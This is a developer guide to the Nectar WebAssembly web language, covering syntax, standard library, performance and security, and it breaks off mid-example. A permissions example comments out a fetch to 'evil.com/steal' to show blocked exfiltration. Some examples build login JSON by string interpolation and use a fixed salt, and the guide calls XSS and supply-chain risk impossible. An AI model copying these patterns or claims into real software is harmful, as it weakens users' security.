# NECTAR.md — The Definitive Best Practices Guide

**Version 0.1.0 | Last updated: 2026-03-12**

This is the authoritative reference for writing idiomatic, high-performance Nectar code. It ships with every Nectar installation and is designed to be read by both developers and AI assistants. If you follow this guide, you will write correct, fast, secure Nectar programs.

---

## Table of Contents

1. [Overview](#1-overview)
2. [Architecture](#2-architecture)
3. [Core Language Rules](#3-core-language-rules)
4. [When to Use What](#4-when-to-use-what)
5. [Standard Library Reference](#5-standard-library-reference)
6. [Performance Best Practices](#6-performance-best-practices)
7. [Security Best Practices](#7-security-best-practices)
8. [Common Patterns](#8-common-patterns)
9. [Anti-Patterns](#9-anti-patterns)
10. [Migration from React/Vue/Svelte](#10-migration-from-reactvuesvelte)
11. [AI Integration Guide](#11-ai-integration-guide)
12. [Build and Deploy](#12-build-and-deploy)

---

## 1. Overview

Nectar is a compiled-to-WebAssembly programming language purpose-built for web applications. It replaces the entire JavaScript frontend stack with a single language that compiles to a flat `.wasm` binary.

**The mental model:** Rust's ownership and safety guarantees + React's declarative component DX + zero JavaScript runtime overhead.

What that means concretely:

- **No garbage collector.** Memory is managed through ownership and borrowing, just like Rust. No GC pauses, no memory leaks from forgotten closures.
- **No virtual DOM.** Fine-grained signals update exactly the DOM nodes that changed, in O(1) time per binding. There is no tree diffing.
- **No JavaScript dependencies.** The entire output is a `.wasm` binary plus a ~2.8 KB (gzip) JS syscall shim that bridges WASM to browser APIs. There is no `node_modules`. There is no bundler. There is no transpiler.
- **No runtime framework.** Components, stores, routers, forms, channels, and agents are language-level constructs compiled directly to WASM instructions.

Nectar gives you one binary (`nectar`) that serves as compiler, formatter, linter, test runner, dev server, package manager, and LSP. One tool. One language. One output.

---

## 2. Architecture

### Compilation Pipeline

```
  .nectar source files
       |
  Compiler (written in Rust)
  |-- Parse --> AST
  |-- Type check + borrow check
  |-- Codegen --> WAT (WebAssembly Text Format)
  +-- Binary emit --> .wasm
       |
  Browser loads .wasm + JS syscall layer (~2.8 KB gzip)
       |
  mount() --> initial render via innerHTML from WASM-built string (1 DOM call)
  flush() --> batched DOM updates from command buffer (1 DOM call per frame)
```

### The JS Syscall Layer

Nectar does not generate JavaScript. ALL application logic runs in WASM. The JS layer is approximately 30 browser API syscalls that WASM cannot call directly:

- DOM manipulation (createElement, setAttribute, innerHTML, etc.)
- Event listener registration
- Fetch / XHR
- localStorage / sessionStorage
- Clipboard API
- setTimeout / setInterval / requestAnimationFrame
- History API (pushState, replaceState)
- Console logging
- Intl API (locale-aware formatting)
- WebSocket
- Web Workers

That is it. Every conditional, every loop, every string operation, every data transformation runs as native WASM instructions in linear memory.

### Rendering Model

**Initial render:** The WASM module builds a complete HTML string in linear memory. A single `mount()` call sets `innerHTML` on the root element. One DOM operation for the entire initial page.

**Updates:** When a signal changes, the WASM module writes opcodes into a command buffer in linear memory. At the next animation frame, a single `flush()` call reads the buffer and executes all queued DOM operations. This means:

- No virtual DOM diffing
- No component tree reconciliation
- O(1) cost per signal change (write opcode to buffer)
- O(n) cost per frame where n = number of changed bindings, not total DOM size

### Runtime Module System

The compiler analyzes your source code and includes only the runtime modules you actually use. There are 22 independent modules. A minimal app that uses only components and signals loads the `core` module (~3 KB). Each additional feature (forms, channels, PWA, etc.) adds its own module only when the compiler detects usage. This is automatic. You do not configure it.

---

## 3. Core Language Rules

### Variables and Mutability

Variables are immutable by default. Use `let mut` to opt into mutability:

```nectar
let name: String = "Nectar";      // immutable -- cannot be reassigned
let mut count: i32 = 0;           // mutable -- can be reassigned
count = count + 1;                // ok
// name = "Other";                // COMPILE ERROR: cannot assign to immutable variable
```

### Signals (Reactive State)

Signals are reactive state variables. When a signal changes, any DOM binding or computed value that depends on it updates automatically:

```nectar
signal count: i32 = 0;            // reactive -- DOM updates on change
signal user: Option<User> = None; // reactive
```

Signals are used inside `store` blocks and inside `component` blocks. In stores, they are the primary state mechanism. In components, they complement `let mut` when you need automatic DOM reactivity.

### Ownership and Borrowing

Nectar uses Rust's ownership model. Every value has exactly one owner. When you assign a value to a new binding or pass it to a function, it **moves** by default:

```nectar
let todo = Todo { id: 1, text: "Buy milk", done: false };
self.todos.push(todo);
// todo is MOVED into the collection -- you cannot use it after this line
```

To read a value without taking ownership, **borrow** it:

```nectar
let r: &Todo = &todo;             // immutable borrow -- can read, cannot modify
let mr: &mut Todo = &mut todo;    // mutable borrow -- can read and modify
```

The borrow checker enforces at compile time:
- You can have many `&` borrows OR exactly one `&mut` borrow, never both
- A borrow cannot outlive the value it references
- These rules prevent data races, use-after-free, and aliased mutation

### Type System

**Primitive types:**

| Type | Description | WASM representation |
|---|---|---|
| `i32` | 32-bit signed integer | `i32` |
| `i64` | 64-bit signed integer | `i64` |
| `u32` | 32-bit unsigned integer | `i32` (unsigned ops) |
| `u64` | 64-bit unsigned integer | `i64` (unsigned ops) |
| `f32` | 32-bit float | `f32` |
| `f64` | 64-bit float | `f64` |
| `bool` | Boolean | `i32` (0 or 1) |
| `String` | UTF-8 string | `(ptr, len)` in linear memory |

**Compound types:**

```nectar
[T]              // Array of T
(T, U)           // Tuple
Option<T>        // Some(T) or None
Result<T, E>     // Ok(T) or Err(E)
Vec<T>           // Growable array
HashMap<K, V>    // Hash map
```

### Pattern Matching

Pattern matching is **exhaustive** -- you must handle every possible variant. The compiler rejects incomplete matches:

```nectar
// CORRECT: all variants handled
match result {
    Ok(value) => process(value),
    Err(e) => handle_error(e),
}

// CORRECT: wildcard covers remaining cases
match filter {
    Filter::Active => show_active(),
    _ => show_all(),
}

// COMPILE ERROR: missing variants
match status {
    AuthStatus::LoggedIn(u) => show_dashboard(u),
    // missing LoggedOut, Loading, Error -- compiler rejects this
}
```

### Error Handling

`Result<T, E>` and `Option<T>` are marked `must_use`. The compiler forces you to handle them:

```nectar
// COMPILE ERROR: unused Result
fetch("/api/data");

// CORRECT: handle the Result
let response = fetch("/api/data");
match response {
    Ok(data) => use_data(data),
    Err(e) => show_error(e),
}

// CORRECT: propagate with ?
let data = fetch("/api/data")?;
```

The `?` operator unwraps `Ok`/`Some` and returns early with `Err`/`None`:

```nectar
fn load_user(id: u32) -> Result<User, String> {
    let response = fetch(f"/api/users/{id}")?;
    let user: User = response.json()?;
    return Ok(user);
}
```

### Format Strings

Prefix a string with `f` to interpolate expressions:

```nectar
let msg = f"Hello {name}, you have {items.len()} items";
let url = f"/api/users/{id}";
```

---

## 4. When to Use What

Nectar has many first-class constructs. Here is when to reach for each one:

### `component` -- UI with State and Rendering

Use for anything that renders DOM. Components combine props, local state, methods, scoped styles, and a render block:

```nectar
component UserCard(user: User) {
    let mut expanded: bool = false;

    fn toggle(&mut self) {
        self.expanded = !self.expanded;
    }

    style {
        .card { padding: "16px"; border-radius: "8px"; }
    }

    render {
        <div class="card">
            <h3>{user.name}</h3>
            <button on:click={self.toggle}>
                {if self.expanded { "Show less" } else { "Show more" }}
            </button>
        </div>
    }
}
```

### `store` -- Global Reactive State

Use when multiple components need to share state. Stores provide signals, actions, computed values, and effects:

```nectar
store AuthStore {
    signal user: Option<User> = None;
    signal token: Option<String> = None;

    async action login(&mut self, email: String, password: String) {
        let response = await fetch("/api/auth/login", {
            method: "POST",
            body: f"{{\"email\":\"{email}\",\"password\":\"{password}\"}}",
        });
        match response.status {
            200 => {
                self.user = Some(response.json());
                self.token = Some(response.headers.get("Authorization"));
            }
            _ => toast.error("Login failed"),
        }
    }

    computed is_logged_in(&self) -> bool {
        self.user.is_some()
    }

    effect on_auth_change(&self) {
        match self.user {
            Some(u) => localStorage_set("user", to_string(u)),
            None => localStorage_remove("user"),
        }
    }
}
```

Components read stores with `StoreName::get_field()` and dispatch with `StoreName::action()`.

### `contract` -- API Boundary Validation

Use for every external API call. Contracts validate data at three levels:

1. **Compile-time:** The compiler checks that your code accesses only fields defined in the contract
2. **Runtime:** Incoming data is validated in WASM against the contract schema
3. **Wire-level:** SHA-256 hash detects when an API response shape has changed from what you built against

```nectar
contract UserAPI {
    url: "https://api.example.com/users",
    method: "GET",
    response {
        id: u32,
        name: String,
        email: String,
    }
}
```

Never call `fetch` directly for external APIs. Always use a contract.

### `page` -- SEO-Optimized Component

Use for pages that need search engine or AI indexing. Pages generate static HTML with meta tags, structured data (JSON-LD), and automatic sitemap entries:

```nectar
page Home() {
    meta {
        title: "My App - Home",
        description: "Welcome to my application",
        og_image: "/images/hero.png",
    }

    render {
        <main>
            <h1>"Welcome"</h1>
        </main>
    }
}
```

### `form` -- Declarative Form with Validation

Use for any user input that needs validation. Forms provide built-in field validation, multi-step wizards, and submission handling:

```nectar
form ContactForm {
    field name: String {
        required: true,
        min_length: 2,
    }
    field email: String {
        required: true,
        pattern: r"^[^@]+@[^@]+\.[^@]+$",
    }
    field message: String {
        required: true,
        max_length: 500,
    }

    on_submit {
        fetch("/api/contact", {
            method: "POST",
            body: self.values(),
        });
        toast.success("Message sent");
    }
}
```

### `channel` -- Real-Time WebSocket

Use for real-time features: chat, notifications, live data. Channels manage WebSocket connections with auto-reconnect and typed messages:

```nectar
channel ChatChannel {
    url: "wss://api.example.com/ws/chat",

    on_message(msg: ChatMessage) {
        ChatStore::add_message(msg);
    }

    on_disconnect {
        toast.warning("Connection lost, reconnecting...");
    }
}
```

### `app` -- PWA Manifest

Use to make your application installable as a Progressive Web App:

```nectar
app MyApp {
    name: "My Application",
    short_name: "MyApp",
    theme_color: "#4f46e5",
    display: "standalone",
    offline: true,

    push_notifications {
        vapid_key: env("VAPID_PUBLIC_KEY"),
    }
}
```

### `agent` -- AI/LLM Integration

Use for AI-powered features. Agents wrap LLM interaction with typed tools, system prompts, and streaming UI:

```nectar
agent Assistant {
    prompt system = "You are a helpful assistant.";

    signal messages: [Message] = [];
    signal streaming: bool = false;

    tool search(query: String) -> String {
        let result = await fetch(f"/api/search?q={query}");
        return result.json().summary;
    }

    fn send(&mut self) { /* ... */ }

    render { /* chat UI */ }
}
```

### `router` -- Client-Side Routing

Use for single-page app navigation with URL-based routing and guards:

```nectar
router AppRouter {
    route "/" => Home,
    route "/about" => About,
    route "/user/:id" => UserProfile,
    route "/admin/*" => AdminPanel guard { AuthStore::is_logged_in() },
    fallback => NotFound,
}
```

---

## 5. Standard Library Reference

The Nectar standard library requires **no imports**. The compiler detects which functions you use and auto-includes only the needed modules. If you do not use a feature, it adds zero bytes to your output.

### Always Include (Recommended for Every App)

#### `debounce(fn, ms)` -- Event Handler Debouncing

Waits until the caller stops invoking for `ms` milliseconds, then executes once. Use for search inputs, resize handlers, and any event that fires rapidly.

```nectar
let search = debounce(self.do_search, 300);
search(); // only executes 300ms after last call
```

**Replaces:** lodash `_.debounce`, custom setTimeout patterns

#### `throttle(fn, ms)` -- Event Handler Throttling

Executes at most once per `ms` milliseconds. Use for scroll handlers, mousemove, and rate-limited operations.

```nectar
let handler = throttle(self.on_scroll, 100);
handler(); // executes at most every 100ms
```

**Replaces:** lodash `_.throttle`

#### `toast` -- Notification System

Built-in toast notifications with four severity levels:

```nectar
toast.success("Saved successfully");
toast.error(f"Failed: {err}");
toast.warning("Connection unstable");
toast.info("New version available");
```

**Replaces:** react-toastify, sonner, react-hot-toast

#### `format` -- Locale-Aware Formatting

Format numbers, currency, percentages, bytes, ordinals, and relative time with full locale support:

```nectar
format::currency(19.99, "USD", "en-US")     // "$19.99"
format::compact(1234567.0)                    // "1.2M"
format::percent(0.156)                        // "15.6%"
format::bytes(1048576)                        // "1.0 MB"
format::ordinal(42)                           // "42nd"
format::relative_time(-3, "day", "en-US")     // "3 days ago"
```

**Replaces:** Intl.NumberFormat wrappers, numeral.js, date-fns/formatRelative

### Include When Needed

#### `crypto` -- Cryptographic Primitives

All operations run in pure WASM. No JS crypto libraries needed:

```nectar
let hash = crypto.sha256("data");                        // SHA-256 hex string
let hash512 = crypto.sha512("data");                     // SHA-512 hex string
let mac = crypto.hmac("key", "message");                 // HMAC-SHA256
let key = crypto.derive_key("password", "salt");         // PBKDF2 key derivation
let encrypted = crypto.encrypt(key, "plaintext");        // AES-256-GCM
let decrypted = crypto.decrypt(key, encrypted);          // AES-256-GCM
let sig = crypto.sign("private_key", "data");            // Ed25519 signature
let valid = crypto.verify("public_key", "data", sig);   // Ed25519 verify
let id = crypto.random_uuid();                            // UUID v4
let bytes = crypto.random_bytes(32);                     // Random bytes
```

**Replaces:** crypto-js, uuid, bcrypt (client-side), any npm crypto package

#### `BigDecimal` -- Arbitrary-Precision Arithmetic

Never use floating-point for money or precision-critical calculations:

```nectar
let price = BigDecimal::new("19.99");
let tax = BigDecimal::new("0.0825");
let total = price.add(price.mul(tax));  // exact: 21.639175
// JavaScript: 19.99 * 0.0825 = 1.6491750000000001 (wrong)
```

Methods: `add`, `sub`, `mul`, `div`, `eq`, `gt`, `lt`, `to_string`, `to_fixed(digits)`

**Replaces:** decimal.js, big.js, bignumber.js

#### `collections` -- Array Operations

```nectar
let grouped = collections::group_by(users, "role");       // HashMap<String, Vec<User>>
let sorted = collections::sort_by(users, "name");         // sorted Vec<User>
let unique = collections::uniq_by(users, "email");         // deduplicated
let pages = collections::chunk(users, 25);                // Vec<Vec<User>>
let flat = collections::flatten(nested);                   // flatten one level
let pairs = collections::zip(names, emails);               // Vec<(String, String)>
let (active, inactive) = collections::partition(users, |u| u.active);
```

**Replaces:** lodash collection methods

#### `url` -- URL Manipulation

```nectar
let parsed = url::parse("https://api.example.com/users?page=1");
let page = url::query_get(parsed.href, "page");           // Some("1")
let filtered = url::query_set(parsed.href, "role", "admin");
```

**Replaces:** query-string, url-parse, URLSearchParams wrappers

#### `mask` -- Input Formatting

Format user input as they type:

```nectar
mask::phone("5551234567")            // "(555) 123-4567"
mask::credit_card("4242424242424242") // "4242 4242 4242 4242"
mask::currency("1234.5")             // "1,234.50"
mask::pattern("ABC123", "AAA-###")   // "ABC-123" (A=letter, #=digit, *=any)
```

**Replaces:** react-input-mask, cleave.js, imask

#### `search` -- Client-Side Fuzzy Search

Build and query a fuzzy search index entirely in WASM:

```nectar
let index = search::create_index(users, vec!["name", "email"]);
let results = search::query(index, "alice");  // ranked results
```

**Replaces:** Fuse.js, Lunr.js, FlexSearch

#### `skeleton` -- Loading Placeholders

Shimmer-animated loading placeholders:

```nectar
skeleton.circle(64)     // circular placeholder, 64px diameter
skeleton.text(3)        // 3 lines of text placeholder
skeleton.rect(200, 120) // rectangular placeholder
skeleton.card()         // card-shaped placeholder
```

**Replaces:** react-loading-skeleton, react-content-loader

#### `pagination` -- Pagination Helpers

```nectar
let page = pagination.paginate(items, current_page, per_page);
// page.data: items for current page
// page.total_pages: total number of pages

let numbers = pagination.page_numbers(current_page, total_pages);
// e.g., [1, 2, 3, "...", 10]
```

**Replaces:** Custom pagination logic, pagination npm packages

#### `clipboard` -- Clipboard API

```nectar
clipboard.copy("text to copy");
clipboard.paste();  // async, returns String
clipboard.copy_image(image_data);
```

#### `search::autocomplete` -- Typeahead Search

Extend a search index with autocomplete and match highlighting:

```nectar
let index = search::create_index(users, vec!["name", "email"]);
let suggestions = search::autocomplete(index, "ali", 5);  // top 5 matches
let highlighted = search::highlight("Alice Smith", "ali"); // "<mark>Ali</mark>ce Smith"
```

**Replaces:** downshift, react-autosuggest, Algolia InstantSearch

#### `data_table` -- Sortable, Filterable Data Tables

Full-featured data table with sort, filter, paginate, pin, and inline editing — all computed in WASM:

```nectar
let table = DataTable::new(users, vec![
    Column { key: "name", label: "Name", sortable: true },
    Column { key: "email", label: "Email", sortable: true },
    Column { key: "role", label: "Role", filterable: true },
]);
table.sort("name", "asc");
table.filter(|user| user.active);
table.paginate(1, 25);
table.pin_column("name");
let rows = table.get_visible_rows();
let csv_export = table.export_csv();
```

**Replaces:** TanStack Table, AG Grid, react-table, DataTables

#### `datepicker` -- Calendar / Date Range Picker

Calendar widget with date range selection, min/max constraints:

```nectar
let picker = datepicker::create(DatePickerOptions {
    mode: "range",
    format: "yyyy-MM-dd",
    min_date: "2024-01-01",
    max_date: "2026-12-31",
});
let value = datepicker::get_value(picker);
datepicker::set_range(picker, "2026-01-01", "2026-06-30");
```

**Replaces:** react-datepicker, flatpickr, date-fns date picker

#### `chart` -- Declarative Charts

Line, bar, pie, scatter charts — SVG path computation in WASM, rendered via DOM syscalls:

```nectar
let line = chart::line(points, ChartOptions {
    width: 800, height: 400,
    title: "Revenue", animate: true,
});
chart::update(line, new_points);

let pie = chart::pie(vec![
    PieSlice { label: "Desktop", value: 65.0, color: "#3b82f6" },
    PieSlice { label: "Mobile", value: 35.0, color: "#f97316" },
], ChartOptions { width: 400, height: 400, title: "Traffic", animate: true });
```

**Replaces:** Chart.js, D3, Recharts, Victory, Nivo

#### `editor` -- Rich Text Editor

WYSIWYG and markdown editing with contenteditable, all text processing in WASM:

```nectar
let ed = editor::create(EditorOptions {
    mode: "wysiwyg",  // or "markdown"
    placeholder: "Start typing...",
});
let html = editor::get_content(ed);
let md = editor::get_markdown(ed);
editor::insert(ed, "**bold text**");
```

**Replaces:** TipTap, ProseMirror, Slate, Quill

#### `image` -- Client-Side Image Processing

Crop, resize, compress images in pure WASM before upload — no server round-trip:

```nectar
let cropped = image::crop(data, 0, 0, 200, 200);
let resized = image::resize(cropped, 100, 100);
let compressed = image::compress(resized, 0.8);  // 80% quality
let base64 = image::to_base64(compressed);
```

**Replaces:** browser-image-compression, cropperjs, sharp (client-side)

#### `csv` -- CSV/Data Import/Export

Parse and generate CSV entirely in WASM:

```nectar
let rows = csv::parse("name,email\nAlice,alice@example.com");
// rows = [["name","email"], ["Alice","alice@example.com"]]

let output = csv::stringify(rows);
let typed = csv::parse_typed::<User>(input);
let exported = csv::export(users, vec!["name", "email"]);
```

**Replaces:** PapaParse, csv-parser, SheetJS (basic CSV)

#### `maps` -- Interactive Maps

Tile-based map rendering with markers, all coordinate math in WASM:

```nectar
let map = maps::create(container, MapOptions {
    center_lat: 37.7749, center_lng: -122.4194,
    zoom: 13, tile_url: "https://tile.openstreetmap.org/{z}/{x}/{y}.png",
});
let marker = maps::add_marker(map, 37.7749, -122.4194, "San Francisco");
maps::set_zoom(map, 15);
```

**Replaces:** Leaflet, Mapbox GL, Google Maps SDK

#### `syntax` -- Syntax Highlighting

Tokenize and highlight code in WASM, outputs span-wrapped HTML:

```nectar
let highlighted = syntax::highlight(code, "nectar");
let with_lines = syntax::highlight_lines(code, "rust", vec![3, 5, 7]);
// Returns HTML with <span class="kw">, <span class="fn">, etc.
```

**Replaces:** Prism, Shiki, highlight.js

#### `media` -- Video/Audio Player

Media player state machine in WASM, video/audio elements via DOM syscalls:

```nectar
let player = media::create_player("video.mp4", MediaOptions {
    controls: true, autoplay: false,
    loop_playback: false, captions_src: "subs.vtt",
});
media::play(player);
media::seek(player, 30.0);
let time = media::get_current_time(player);
```

**Replaces:** Video.js, Plyr, react-player

#### `qr` -- QR Code Generation

QR algorithm runs in pure WASM, outputs SVG or pixel buffer:

```nectar
let svg = qr::generate("https://buildnectar.com", 256);  // SVG string
let png = qr::generate_png("https://buildnectar.com", 256);  // pixel buffer
```

**Replaces:** qrcode, qrcode-generator, jsQR (generation)

#### `share` -- Web Share API

Native share dialog (uses one browser API syscall):

```nectar
if share::can_share() {
    share::native("Check this out", "Nectar is amazing", "https://buildnectar.com");
}
```

**Replaces:** react-share, Web Share API boilerplate

#### `wizard` -- Multi-Step Wizard

Step-by-step form/workflow state machine, pure WASM:

```nectar
let wiz = wizard::create(vec![
    WizardStep { name: "Account", validator: validate_account },
    WizardStep { name: "Profile", validator: validate_profile },
    WizardStep { name: "Confirm", validator: validate_confirm },
]);
wizard::next(wiz);      // advance if current step validates
wizard::prev(wiz);      // go back
let step = wizard::get_current_step(wiz);
let data = wizard::get_data(wiz);
```

**Replaces:** react-step-wizard, multi-step form libraries

#### `combobox` -- Multi-Select Combobox

Filterable dropdown with multi-select, state managed in WASM:

```nectar
let cb = combobox::create(vec!["JavaScript", "Rust", "Python", "Go"]);
combobox::set_filter(cb, "ru");       // filters to "Rust"
let selected = combobox::get_selected(cb);  // ["Rust"]
```

**Replaces:** react-select, downshift, headless UI combobox

### Feature-Specific (Keyword + Std Lib)

These features are available both as language keywords (for declarative config) and as std lib functions (for programmatic use):

| Feature | Keyword | Std Lib Functions | When to use |
|---|---|---|---|
| **Theming** | `theme { light {...} dark {...} }` | `theme::init()`, `theme::toggle()`, `theme::set()`, `theme::current()` | Light/dark mode toggle |
| **Auth** | `auth { providers: [...] }` | `auth::init()`, `auth::login()`, `auth::logout()`, `auth::get_user()` | OAuth login flows |
| **File Upload** | `upload { max_size: ... }` | `upload::init()`, `upload::start()`, `upload::cancel()` | File upload with progress |
| **Local DB** | `db { stores: [...] }` | `db::open()`, `db::put()`, `db::get()`, `db::delete()`, `db::query()` | IndexedDB with typed schema |
| **Animation** | `spring`, `keyframes`, `stagger` | `animate::spring()`, `animate::keyframes()`, `animate::stagger()`, `animate::cancel()` | Physics, CSS, or list animations |
| **Responsive** | `breakpoints { ... }` + `fluid()` | `responsive::register_breakpoints()`, `responsive::get_breakpoint()`, `responsive::fluid()` | Responsive layouts |
| **Shortcuts** | `shortcut "Cmd+S" => self.save` | Component-level | Keyboard shortcuts |
| **Drag & Drop** | `draggable` / `droppable` | Template-level | Drag and drop interfaces |

---

## 6. Performance Best Practices

### Use Signals for Reactive State

Signals update the DOM in O(1) time. `let mut` requires you to manually trigger re-renders or rely on the method call boundary. For any state that appears in a `render` block, prefer `signal`:

```nectar
// GOOD: signal updates DOM automatically in O(1)
signal count: i32 = 0;

// ACCEPTABLE: let mut works but updates are tied to method boundaries
let mut count: i32 = 0;
```

In stores, always use `signal`. In components, use `signal` for state referenced in templates and `let mut` for internal bookkeeping that does not affect the DOM.

### Virtualize Long Lists

For lists over 100 items, use the `virtual` keyword. It renders only visible items plus a buffer, keeping DOM node count constant regardless of list size:

```nectar
// BAD: renders 10,000 DOM nodes
{for item in self.items {
    <div>{item.name}</div>
}}

// GOOD: renders ~30 DOM nodes regardless of list size
virtual(self.items, item_height: 48) {
    <div>{item.name}</div>
}
```

The `virtual` keyword handles 100K+ items with approximately 30 DOM nodes.

### Code-Split Heavy Components

Use `lazy` for components that are not needed on initial load:

```nectar
lazy component HeavyChart(data: [f64]) {
    render { <canvas /> }
}
```

Use `chunk` for explicit code splitting:

```nectar
chunk "admin" {
    component AdminPanel() { /* ... */ }
    component AdminSettings() { /* ... */ }
}
```

### Use Contracts for API Calls

Contracts validate response data inside WASM, not JavaScript. This is faster than JSON schema validation in JS and catches structural changes at compile time:

```nectar
// BAD: raw fetch, no validation, JS-land parsing
let data = fetch("/api/users").json();

// GOOD: validated in WASM, compile-time field checking
contract UserAPI {
    url: "/api/users",
    method: "GET",
    response { id: u32, name: String, email: String }
}
```

### Minimize DOM Nodes

The `mount()`/`flush()` system works best with minimal DOM. Do not wrap everything in extra `<div>` tags. Use `<Fragment>` when you need to return multiple siblings without a wrapper:

```nectar
// BAD: unnecessary wrapper div
render {
    <div>
        <div>
            <h1>"Title"</h1>
            <p>"Content"</p>
        </div>
    </div>
}

// GOOD: flat structure
render {
    <Fragment>
        <h1>"Title"</h1>
        <p>"Content"</p>
    </Fragment>
}
```

### Use `fluid()` for Responsive Values

`fluid()` compiles to CSS `clamp()`, which runs on the GPU with zero JavaScript overhead:

```nectar
// BAD: JS-based responsive logic that runs on every resize
fn get_font_size(&self) -> String {
    if window_width > 1024 { "24px" } else { "16px" }
}

// GOOD: pure CSS, GPU-accelerated, zero JS
style {
    h1 { font-size: fluid("16px", "24px"); }
}
```

### Debounce and Throttle Event Handlers

Never attach expensive operations directly to high-frequency events:

```nectar
// BAD: fires on every keystroke
fn on_input(&mut self, value: String) {
    self.results = fetch(f"/api/search?q={value}");
}

// GOOD: waits 300ms after last keystroke
fn on_input(&mut self, value: String) {
    self.query = value;
    let search = debounce(self.do_search, 300);
    search();
}
```

### Choose the Right Animation Primitive

| Primitive | Runs on | Best for | Performance |
|---|---|---|---|
| `keyframes` | CSS / GPU | Opacity, transform, color | Best -- compositor thread |
| `spring` | JS / rAF | Physics-based motion | Good -- main thread |
| `stagger` | CSS / GPU | Sequential list animations | Best -- compositor thread |

Prefer `keyframes` when possible. Use `spring` only when you need physics-based easing (bounce, overshoot). All animation primitives respect `prefers-reduced-motion` automatically.

### Use `parallel` for Concurrent Data Fetching

```nectar
// BAD: sequential, 3x latency
let users = await fetch("/api/users");
let posts = await fetch("/api/posts");
let comments = await fetch("/api/comments");

// GOOD: concurrent, 1x latency
let (users, posts, comments) = parallel {
    fetch("/api/users"),
    fetch("/api/posts"),
    fetch("/api/comments"),
};
```

---

## 7. Security Best Practices

### Use `secret` for Sensitive Values

The `secret` keyword marks a value as sensitive. The compiler enforces taint tracking -- secrets cannot be logged, displayed in the DOM, or sent to unauthorized endpoints:

```nectar
fn handle_login(secret password: String) {
    let key = crypto.derive_key(password, "salt");
    // println(password);  // COMPILE ERROR: cannot log secret value
    // <span>{password}</span>  // COMPILE ERROR: cannot render secret
}
```

### Use `permissions` to Restrict Components

Capability-based security limits what a component can do:

```nectar
component PaymentForm() {
    permissions {
        network: ["https://api.stripe.com/*"],
        storage: false,
        clipboard: false,
    }

    // fetch("https://evil.com/steal")  // COMPILE ERROR: not in allowed network list
    render { /* ... */ }
}
```

### Always Use Contracts for External Data

Never trust data from external APIs. Contracts validate structure and type at the WASM boundary:

```nectar
// DANGEROUS: no validation, trusting arbitrary JSON
let user = fetch("/api/user").json();

// SAFE: validated against contract schema in WASM
contract UserContract {
    url: "/api/user",
    response { id: u32, name: String, role: String }
}
```

### Sandbox Third-Party Embeds

When embedding third-party scripts (analytics, widgets, etc.), always use `sandbox: true`:

```nectar
embed Analytics {
    src: "https://analytics.example.com/script.js",
    sandbox: true,           // isolates in sandboxed iframe
    loading: "idle",         // load when browser is idle
    integrity: "sha384-...", // SRI hash
}
```

Run `nectar audit` periodically to check embedded scripts for known vulnerabilities.

### XSS is Structurally Impossible

Nectar does not have `innerHTML` available to user code. All text content in templates is automatically escaped. There is no `eval()`, no `document.write()`, no `dangerouslySetInnerHTML`. The only `innerHTML` call happens in the runtime's `mount()` function, which writes a WASM-generated string that has already been escaped at the WASM level.

Prototype pollution is also impossible because WASM linear memory is a flat byte array -- there are no JavaScript objects to pollute.

### Zero Supply Chain Risk

Your Nectar application has zero `node_modules`. The standard library is compiled into WASM from Rust. There are no transitive JavaScript dependencies for an attacker to compromise. The attack surface is: your code, the Nectar compiler, and the ~2.8 KB JS syscall shim (which you can audit in minutes).

---

## 8. Common Patterns

### Authenticated App with Route Guards

```nectar
store AuthStore {
    signal user: Option<User> = None;
    signal token: Option<String> = None;

    computed is_authenticated(&self) -> bool {
        self.token.is_some()
    }

    async action login(&mut self, email: String, password: String) {
        let response = await fetch("/api/auth/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: f"{{\"email\":\"{email}\",\"password\":\"{password}\"}}",
        });
        match response.status {
            200 => {
                let data = response.json();
                self.user = Some(data.user);
                self.token = Some(data.token);
                navigate("/dashboard");
            }
            _ => toast.error("Invalid credentials"),
        }
    }

    action logout(&mut self) {
        self.user = None;
        self.token = None;
        navigate("/login");
    }
}

router AppRouter {
    route "/" => Home,
    route "/login" => LoginPage,
    route "/dashboard" => Dashboard guard { AuthStore::is_authenticated() },
    route "/settings" => Settings guard { AuthStore::is_authenticated() },
    fallback => NotFound,
}
```

### Data Fetching with Loading/Error States

```nectar
store PostStore {
    signal posts: [Post] = [];
    signal loading: bool = false;
    signal error: Option<String> = None;

    async action fetch_posts(&mut self) {
        self.loading = true;
        self.error = None;

        let response = await fetch("/api/posts");
        match response.status {
            200 => {
                self.posts = response.json();
            }
            _ => {
                self.error = Some(f"Failed to load posts: {response.status}");
            }
        }
        self.loading = false;
    }
}

component PostList() {
    render {
        <div>
            {if PostStore::get_loading() {
                <div>
                    {skeleton.text(5)}
                </div>
            } else if PostStore::get_error().is_some() {
                <div class="error">
                    <p>{PostStore::get_error().unwrap()}</p>
                    <button on:click={PostStore::fetch_posts}>"Retry"</button>
                </div>
            } else {
                <ul>
                    {for post in PostStore::get_posts() {
                        <li>
                            <h3>{post.title}</h3>
                            <p>{post.body}</p>
                        </li>
                    }}
                </ul>
            }}
        </div>
    }
}
```

### Form with Validation and Submission

```nectar
form RegisterForm {
    field username: String {
        required: true,
        min_length: 3,
        max_length: 20,
    }
    field email: String {
        required: true,
        pattern: r"^[^@]+@[^@]+\.[^@]+$",
    }
    field password: String {
        required: true,
        min_length: 8,
    }
    field confirm_password: String {
        required: true,
        matches: "password",
    }

    on_submit {
        let result = await fetch("/api/register", {
            method: "POST",
            body: self.values(),
        });
        match result.status {
            201 => {
                toast.success("Account created");
                navigate("/login");
            }
            409 => toast.error("Email already taken"),
            _ => toast.error("Registration failed"),
        }
    }
}
```

### Real-Time Chat with Channels

```nectar
struct ChatMessage {
    sender: String,
    content: String,
    timestamp: i64,
}

channel ChatChannel {
    url: "wss://api.example.com/ws/chat",

    on_message(msg: ChatMessage) {
        ChatStore::add_message(msg);
    }

    on_disconnect {
        toast.warning("Reconnecting...");
    }
}

store ChatStore {
    signal messages: [ChatMessage] = [];

    action add_message(&mut self, msg: ChatMessage) {
        self.messages.push(msg);
    }

    action send(&mut self, content: String) {
        let msg = ChatMessage {
            sender: AuthStore::get_user().unwrap().name,
            content: content,
            timestamp: performance_now() as i64,
        };
        ChatChannel::send(msg);
        self.messages.push(msg);
    }
}

component ChatRoom() {
    let mut input: String = "";

    fn on_send(&mut self) {
        if !self.input.is_empty() {
            ChatStore::send(self.input);
            self.input = "";
        }
    }

    render {
        <div class="chat">
            <div class="messages">
                {for msg in ChatStore::get_messages() {
                    <div class="message">
                        <strong>{msg.sender}</strong>
                        <span>{msg.content}</span>
                    </div>
                }}
            </div>
